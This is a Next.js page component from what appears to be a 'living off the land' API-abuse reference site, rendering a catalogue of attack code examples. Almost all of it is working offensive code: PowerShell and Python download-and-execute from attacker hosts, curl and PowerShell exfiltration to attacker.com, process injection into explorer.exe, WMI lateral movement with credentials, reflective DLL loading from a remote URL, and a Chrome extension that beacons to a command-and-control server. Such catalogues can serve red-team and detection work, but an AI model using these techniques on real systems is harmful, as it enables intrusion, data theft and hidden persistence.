'use client'

import Link from 'next/link'

const examples = [
  {
    title: 'Command Execution via PowerShell',
    description: 'Execute arbitrary commands using PowerShell and .NET APIs',
    languages: ['PowerShell', 'Python'],
    code: {
      PowerShell: `# Using Process.Start to execute commands
[System.Diagnostics.Process]::Start("cmd.exe", "/c whoami")

# Using WMI to execute remotely
Invoke-WmiMethod -Path "Win32_Process" -Name Create -ArgumentList "cmd.exe /c whoami"

# Download and execute via .NET HttpClient
$client = New-Object System.Net.Http.HttpClient
$response = $client.GetAsync("http://attacker/payload.exe").Result
$bytes = $response.Content.ReadAsByteArrayAsync().Result
$exec = [System.Reflection.Assembly]::Load($bytes)`,
      Python: `import subprocess
import http.client

# Simple command execution
proc = subprocess.Popen("cmd.exe /c whoami", shell=True)
proc.wait()

# Download and execute (conceptual)
conn = http.client.HTTPSConnection("attacker.com")
conn.request("GET", "/payload.exe")
response = conn.getresponse()
payload = response.read()`,
    },
    apis: ['1', '2', '4'],
  },
  {
    title: 'Data Exfiltration via HTTPS',
    description: 'Exfiltrate sensitive data using HTTP/HTTPS',
    languages: ['PowerShell', 'Python', 'curl'],
    code: {
      PowerShell: `# Send data to C2 server
$data = Get-Content "C:\\sensitive\\file.txt"
$client = New-Object System.Net.Http.HttpClient
$content = New-Object System.Net.Http.StringContent($data)
$response = $client.PostAsync("http://attacker.com/receive", $content).Result

# Alternative: Using WebClient
$wc = New-Object System.Net.WebClient
$wc.UploadString("http://attacker.com/receive", $data)`,
      Python: `import requests

# Send data to C2
with open('sensitive_file.txt', 'r') as f:
    data = f.read()

response = requests.post('http://attacker.com/receive', data=data)
print(f"Status: {response.status_code}")`,
      curl: `# Simple data exfiltration
curl -X POST http://attacker.com/receive -d "data=$(whoami)@$(hostname)"

# Send file content
curl -X POST http://attacker.com/receive --data-binary @sensitive_file.txt`,
    },
    apis: ['4'],
  },
  {
    title: 'Process Injection for Evasion',
    description: 'Inject code into legitimate processes to evade detection',
    languages: ['PowerShell'],
    code: {
      PowerShell: `# VirtualAllocEx + WriteProcessMemory + CreateRemoteThread pattern
Add-Type -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
"@ -Name Win32 -Namespace Win32Functions

# Get target process
$targetProcess = Get-Process explorer | Select-Object -First 1
$hProcess = [Win32Functions.Win32]::OpenProcess(0x001F0FFF, $false, $targetProcess.Id)

# Allocate memory
$shellcode = @(0x90) * 1024  # Example: NOP sled
$addr = [Win32Functions.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 1024, 0x1000, 0x40)

# Write shellcode
$bytesWritten = 0
[Win32Functions.Win32]::WriteProcessMemory($hProcess, $addr, $shellcode, 1024, [ref]$bytesWritten)

# Create remote thread
$threadId = 0
[Win32Functions.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)`,
    },
    apis: ['5'],
  },
  {
    title: 'Lateral Movement via WMI',
    description: 'Move laterally across network using WMI and remote process execution',
    languages: ['PowerShell'],
    code: {
      PowerShell: `# Lateral movement with credentials
$targetHost = "server2.domain.com"
$username = "DOMAIN\\\\Administrator"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

# Execute command remotely
$proc = Invoke-WmiMethod -ComputerName $targetHost \`
  -Path "Win32_Process" \`
  -Name Create \`
  -ArgumentList "cmd.exe /c whoami" \`
  -Credential $cred

Write-Host "Process ID: $($proc.processId)"

# Alternative: Using CIM (newer method)
$cimSession = New-CimSession -ComputerName $targetHost -Credential $cred
Invoke-CimMethod -CimSession $cimSession -ClassName Win32_Process -MethodName Create \`
  -Arguments @{CommandLine = "cmd.exe /c whoami"}`,
    },
    apis: ['2'],
  },
  {
    title: 'Reflective Assembly Loading',
    description: 'Load .NET assemblies from memory for stealthy code execution',
    languages: ['PowerShell'],
    code: {
      PowerShell: `# Download DLL and load via Reflection
$url = "http://attacker.com/malicious.dll"
$client = New-Object System.Net.WebClient
$bytes = $client.DownloadData($url)

# Load assembly from byte array
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Get type and execute method
$type = $assembly.GetType("Namespace.ClassName")
$method = $type.GetMethod("Main")
$method.Invoke($null, @())

# Alternative: Using System.Reflection.Assembly.LoadFrom for local files
$assembly2 = [System.Reflection.Assembly]::LoadFrom("C:\\\\temp\\\\payload.dll")`,
    },
    apis: ['3'],
  },
  {
    title: 'Browser Extension Persistence',
    description: 'Persist data in Chrome extensions for long-term access',
    languages: ['JavaScript'],
    code: {
      JavaScript: `// manifest.json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": ["storage", "http://*/*", "https://*/*"],
  "background": {
    "service_worker": "background.js"
  },
  "host_permissions": ["http://*/*", "https://*/*"]
}

// background.js
chrome.runtime.onInstalled.addListener(() => {
  // Store C2 configuration
  chrome.storage.sync.set({
    'c2_url': 'http://attacker.com/api',
    'beacon_interval': 3600,
    'exfil_data': [],
    'installed_at': new Date().toISOString()
  });
});

// Periodic C2 communication
setInterval(() => {
  chrome.storage.sync.get(['c2_url', 'exfil_data'], (result) => {
    // Send exfiltrated data to C2
    fetch(result.c2_url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({data: result.exfil_data})
    });
    
    // Clear sent data
    chrome.storage.sync.set({'exfil_data': []});
  });
}, result.beacon_interval * 1000);`,
    },
    apis: ['6'],
  },
]

export default function Examples() {
  return (
    <>
      {/* Header */}
      <section className="bg-gradient-purple text-white py-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <h1 className="text-4xl font-bold mb-4">Code Examples</h1>
          <p className="text-lg opacity-90">
            Real code examples for common LOTL API abuse scenarios.
          </p>
        </div>
      </section>

      {/* Content */}
      <section className="py-16">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="space-y-12">
            {examples.map((example, idx) => (
              <div key={idx} className="border-l-4 border-purple-500 pl-6">
                <h2 className="text-3xl font-bold mb-2">{example.title}</h2>
                <p className="text-gray-600 mb-4">{example.description}</p>

                {/* Related APIs */}
                <div className="mb-6 pb-6 border-b border-gray-200">
                  <p className="text-sm font-semibold text-gray-700 mb-2">Related APIs:</p>
                  <div className="flex flex-wrap gap-2">
                    {example.apis.map((apiId) => {
                      const apiNames: Record<string, string> = {
                        '1': 'Process.Start',
                        '2': 'WMI Win32_Process',
                        '3': 'Reflection.Assembly',
                        '4': 'HttpClient',
                        '5': 'VirtualAllocEx',
                        '6': 'Chrome storage.sync',
                      }
                      return (
                        <Link
                          key={apiId}
                          href={`/apis/${apiId}`}
                          className="text-xs bg-purple-100 text-purple-700 px-3 py-1 rounded-full hover:bg-purple-200"
                        >
                          {apiNames[apiId]} →
                        </Link>
                      )
                    })}
                  </div>
                </div>

                {/* Code Examples */}
                <div className="space-y-4">
                  {example.languages.map((lang) => (
                    <div key={lang}>
                      <h3 className="text-lg font-semibold mb-2">{lang}</h3>
                      <pre className="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm">
                        <code>{example.code[lang as keyof typeof example.code]}</code>
                      </pre>
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>

          {/* Help Section */}
          <div className="mt-16 pt-12 border-t border-gray-200">
            <h2 className="text-3xl font-bold mb-6">Want to Submit Your Example?</h2>
            <p className="text-gray-600 mb-6">
              We're always looking for real-world examples and use cases to share with the community. If you have an example you'd like to contribute, please:
            </p>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <a
                href="https://github.com/TheMagicClaw/LOLAPI/pulls"
                target="_blank"
                rel="noopener noreferrer"
                className="bg-purple-50 border-2 border-purple-200 rounded-lg p-6 hover:border-purple-500 hover:shadow-lg transition"
              >
                <h3 className="text-lg font-bold text-purple-900 mb-2">Submit a Pull Request</h3>
                <p className="text-gray-700">
                  Fork the repository and submit a PR with your new example.
                </p>
              </a>

              <a
                href="https://github.com/TheMagicClaw/LOLAPI/discussions"
                target="_blank"
                rel="noopener noreferrer"
                className="bg-purple-50 border-2 border-purple-200 rounded-lg p-6 hover:border-purple-500 hover:shadow-lg transition"
              >
                <h3 className="text-lg font-bold text-purple-900 mb-2">Start a Discussion</h3>
                <p className="text-gray-700">
                  Discuss ideas and get feedback before submitting a PR.
                </p>
              </a>
            </div>
          </div>
        </div>
      </section>
    </>
  )
}
